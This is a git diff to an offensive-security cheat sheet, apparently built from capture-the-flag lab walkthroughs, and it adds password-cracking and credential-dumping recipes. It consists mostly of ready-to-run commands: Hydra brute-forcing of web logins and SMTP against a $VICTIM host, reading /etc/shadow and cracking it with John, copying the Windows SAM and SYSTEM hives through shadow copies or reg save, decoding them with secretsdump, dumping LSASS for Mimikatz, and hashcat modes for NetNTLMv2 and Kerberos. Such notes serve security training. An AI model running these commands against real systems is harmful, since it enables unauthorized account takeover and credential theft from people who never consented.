@@ -17,6 +17,39 @@ python3 hash-id.py $HASH
 
 
 
+## Create Password Lists
+
+#### Examples
+
+[password-attacks.md](password-attacks.md "mention")
+
+In some cases the default password lists aren't enough. We may get some sort of clue that shows we should use a modified list. Below are some general steps to follow to create it. First make a format that it should follow some sort of standard. Below we are going to make our list with the below criteria as an example does the following:
+
+1. Start with an uppercase letter followed by a lowercase letter.
+2. Have two consecutive digits somewhere in the password.
+3. Start with one of the specified special characters (!, @, #, $).
+
+### **Explanation**
+
+* `Az`: This part of the rule specifies that the rule is applied only to passwords containing at least one uppercase letter (`A-Z`) followed by a lowercase letter (`a-z`).
+* `"[0-9][0-9]"`: This part of the rule indicates that the password should contain two consecutive digits (numbers from 00 to 99).
+* `^[!@#$]`: This part of the rule uses the caret (^) at the beginning to enforce that the following characters should be at the start of the password. It specifies that the password should start with one of the characters listed within the square brackets: `!`, `@`, `#`, or `$`. The `!` is a negation operator, meaning it should not start with any character other than the ones listed.
+
+#### **john.conf**
+
+```
+[List.Rules:THM-Password-Attacks]
+Az"[0-9][0-9]" ^[!@#$]
+```
+
+This will create your list which you then can use with hydra, john or any other brute forcing tools
+
+**Kali**
+
+```
+john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
+```
+
 ## Web
 
 ### Crack a simple web login
@@ -31,7 +64,11 @@ python3 hash-id.py $HASH
 hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
 
+
+
 ### **Crafting request for Hydra**
+
+This example shows how to brute force a POST request. Check HackPark how to get the request from Burp.
 
 #### Examples
 
@@ -40,8 +77,24 @@ hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100
 **Kali**
 
 ```
-hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.110.93 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=vvTqZ%2FG4tEKhQoxeTpJ%2FyGxM9ZY9ZIvd6YMUS%2BoY3uaQCjC%2BJRdlkd8rbIQsDHztL%2BjsAvOLJhxU7vTNo3GP%2FLEmsndGPNAlCDn%2FB%2FrK2ynp9QkhRe9iqKBUmM5FQT2kX%2Bg%2BfPDNnTuzqW5IlmTujw4sLEzbvvec9FDW4cbQevgTj1tHnKx0vMmkVah5imro0o%2BHvQ5%2FGvpafEs1NdnW6wrSsUFuXnYzletKCdLG%2FgSb7bCDOK4ukZK%2F1cMOgYtjOCU4gk4M7PhQcYZmGpAN7pPVCMpX2YwGnTSgBPPmCB6avoLqG5jRS%2F3PYMjsqEGcD9P9S555GMQPxtfyvOEaJw%2B%2BZELKU2yVYr4uWxamEITsWNAT&__EVENTVALIDATION=Tp%2B5DS80H3PFB8ipJ24uKyHkPhSkqKD7GFJlc2U6IaO61l68aholdIjrZJ%2FsotSi0QxRBQjayWovmb2SU%2Fk6lY%2BOpju62jOGDkAvqcdNsqGrgf3vrAYw88XT2ONABFvDTR771I2YAr7JylJ0HbBZV83nGvvXWSC6rmKDGn80%2FuszTjDZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V
+hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=vvTqZ%2FG4tEKhQoxeTpJ%2FyGxM9ZY9ZIvd6YMUS%2BoY3uaQCjC%2BJRdlkd8rbIQsDHztL%2BjsAvOLJhxU7vTNo3GP%2FLEmsndGPNAlCDn%2FB%2FrK2ynp9QkhRe9iqKBUmM5FQT2kX%2Bg%2BfPDNnTuzqW5IlmTujw4sLEzbvvec9FDW4cbQevgTj1tHnKx0vMmkVah5imro0o%2BHvQ5%2FGvpafEs1NdnW6wrSsUFuXnYzletKCdLG%2FgSb7bCDOK4ukZK%2F1cMOgYtjOCU4gk4M7PhQcYZmGpAN7pPVCMpX2YwGnTSgBPPmCB6avoLqG5jRS%2F3PYMjsqEGcD9P9S555GMQPxtfyvOEaJw%2B%2BZELKU2yVYr4uWxamEITsWNAT&__EVENTVALIDATION=Tp%2B5DS80H3PFB8ipJ24uKyHkPhSkqKD7GFJlc2U6IaO61l68aholdIjrZJ%2FsotSi0QxRBQjayWovmb2SU%2Fk6lY%2BOpju62jOGDkAvqcdNsqGrgf3vrAYw88XT2ONABFvDTR771I2YAr7JylJ0HbBZV83nGvvXWSC6rmKDGn80%2FuszTjDZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V
 ```
+
+
+
+This example shows how to brute force a GET request. Check Password Attacks how to get the request from Burp.
+
+#### Examples
+
+[password-attacks.md](password-attacks.md "mention")
+
+**Kali**
+
+```
+hydra -l $USERNAME -P dict.lst $VICTIM http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php"
+```
+
+
 
 
 
@@ -72,6 +125,16 @@ hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100
 john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
 ```
 
+## SMTP
+
+Crack password for a specfic username
+
+**Kali**
+
+```
+hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt smtp://$VICTIM:25 -v
+```
+
 ## Files
 
 ### Protected Zip Files
@@ -100,7 +163,132 @@ john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt
 ```
 
+### Shadow
 
+#### Examples
+
+[linux-privesc.md](../../walkthroughs/tryhackme/linux-privesc.md "mention")
+
+If /etc/shadow is readable you might be able to crack the hashes.
+
+**Victim**
+
+```
+cat /etc/shadow
+```
+
+**Kali**
+
+```
+unshadow passwd shadow > passwords.txt
+```
+
+**Kali**
+
+```
+python hash-id.py $HASH
+```
+
+**Kali**
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+```
+
+
+
+### Volume Shadow Copy Service
+
+**Examples**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information about the service.
+
+More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with administrator privileges as follows,
+
+1. Run the standard cmd.exe prompt with administrator privileges.
+2. Execute the wmic command to create a copy shadow of C: drive
+3. Verify the creation from step 2 is available.
+4. Copy the SAM database from the volume we created in step 2
+
+Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:
+
+**Victim(cmd)**
+
+```
+wmic shadowcopy call create Volume='C:\'
+```
+
+Once the command is successfully executed, let's use the `vssadmin`, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the `C:` volume.&#x20;
+
+**Victim(cmd)**
+
+```
+vssadmin list shadows
+```
+
+The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1.
+
+As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in c:\Windows\System32\Config\system.
+
+Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,
+
+**Victim(cmd)**
+
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\$VICTIM\Desktop\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\$VICTIM\Desktop\system
+```
+
+Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work).
+
+### Registry Hives
+
+**Examples**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.
+
+**Victim(cmd)**
+
+```
+reg save HKLM\sam C:\users\$USER\Desktop\sam-reg
+reg save HKLM\system C:\users\$USER\Desktop\system-reg
+```
+
+Let's this time decrypt it using one of the Impacket tools: `secretsdump.py.`The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques.
+
+Move both SAM and system files back to Kali
+
+**Kali**&#x20;
+
+```
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
+```
+
+### Local Security Authority Subsystem Service (LSASS)
+
+#### Graphic User Interface (GUI)
+
+To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".
+
+![](<../../.gitbook/assets/image (7) (1) (4) (2).png>)
+
+![](<../../.gitbook/assets/image (6) (1) (5).png>)
+
+Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline.
+
+Note: if we try this on the provided VM, you should get an error the first time this is run, until we fix the registry value in the Protected LSASS section later in this task.
+
+Copy the dumped process to the Mimikatz folder
+
+**Victim(cmd)**
+
+```
+copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
+```
 
 ## Hashes
 
@@ -144,7 +332,9 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
 
 #### Examples
 
-[overpass-2-hacked.md](../../walkthroughs/tryhackme/overpass-2-hacked.md "mention")[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")
+[overpass-2-hacked.md](../../walkthroughs/tryhackme/overpass-2-hacked.md "mention")[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[linux-privesc.md](../../walkthroughs/tryhackme/linux-privesc.md "mention")
+
+
 
 **Kali**
 
@@ -158,8 +348,6 @@ john --format=raw-sha512 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 hashcat -m 1710 -w /usr/share/wordlists/rockyou.txt hash.txt
 hashcat -m 1710 hash.txt --show
 ```
-
-
 
 ### Crack BCrypt
 
@@ -220,11 +408,24 @@ hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
 ```
 
+### Crack NetNTLMv2
+
+#### Examples
+
+[breaching-active-directory.md](../../walkthroughs/tryhackme/breaching-active-directory.md "mention")
+
+**Kali**
+
+```
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
+```
+
 ### Crack Kerberos 5, etype 23, TGS-REP
 
 #### Examples
 
-[attacking-kerberos-1.md](../../walkthroughs/tryhackme/attacking-kerberos-1.md "mention")
+[attacking-kerberos-1.md](../../walkthroughs/tryhackme/attacking-kerberos-1.md "mention")[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")
 
 
 
@@ -247,8 +448,6 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt --show
 hashcat -m 18200 hash.txt Pass.txt
 hashcat -m 18200 hash.txt Pass.txt --show
 ```
-
-
 
 
 
